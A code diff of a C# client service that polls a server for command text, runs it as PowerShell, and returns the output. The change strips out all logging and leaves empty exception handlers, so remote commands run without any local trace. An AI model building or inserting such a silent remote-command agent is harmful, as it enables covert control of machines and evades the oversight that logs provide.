@@ -15,18 +15,6 @@ namespace Client.Modules.PowerShell.Service
 {
     public class CommandListenerService
     {
-        private readonly ILogger<CommandListenerService>? _logger;
-
-        public CommandListenerService()
-        {
-            _logger = null;
-        }
-
-        public CommandListenerService(ILogger<CommandListenerService> logger)
-        {
-            _logger = logger;
-        }
-
         [SupportedOSPlatform("windows")]
         public async Task CheckAndExecuteAsync(HttpClient client, CancellationToken stoppingToken)
         {
@@ -50,8 +38,6 @@ namespace Client.Modules.PowerShell.Service
 
                         if (commandObj != null && !string.IsNullOrEmpty(commandObj.CommandText))
                         {
-                            LogMessage($"Отримано команду для виконання: {commandObj.CommandText}");
-
                             string executionResult = ExecutePowerShell(commandObj.CommandText);
 
                             var resultPayload = new { Result = executionResult };
@@ -59,14 +45,10 @@ namespace Client.Modules.PowerShell.Service
                         }
                     }
                 }
-                else
-                {
-                    LogWarning($"Сервер повернув помилку при опитуванні команд: {response.StatusCode}");
-                }
             }
-            catch (Exception ex)
+            catch 
             {
-                LogError(ex, "Помилка під час отримання або виконання команди на клієнті.");
+                
             }
         }
 
@@ -101,27 +83,8 @@ namespace Client.Modules.PowerShell.Service
             }
             catch (Exception ex)
             {
-                _logger.LogError(ex, "Помилка під час отримання або виконання команди на клієнті.");
                 return "";
             }
-        }
-
-        private void LogMessage(string message)
-        {
-            if (_logger != null) _logger.LogInformation(message);
-            else System.Diagnostics.Debug.WriteLine($"[INFO] {message}");
-        }
-
-        private void LogWarning(string message)
-        {
-            if (_logger != null) _logger.LogWarning(message);
-            else System.Diagnostics.Debug.WriteLine($"[WARN] {message}");
-        }
-
-        private void LogError(Exception ex, string message)
-        {
-            if (_logger != null) _logger.LogError(ex, message);
-            else System.Diagnostics.Debug.WriteLine($"[ERROR] {message}: {ex.Message}\n{ex.StackTrace}");
         }
     }
 }
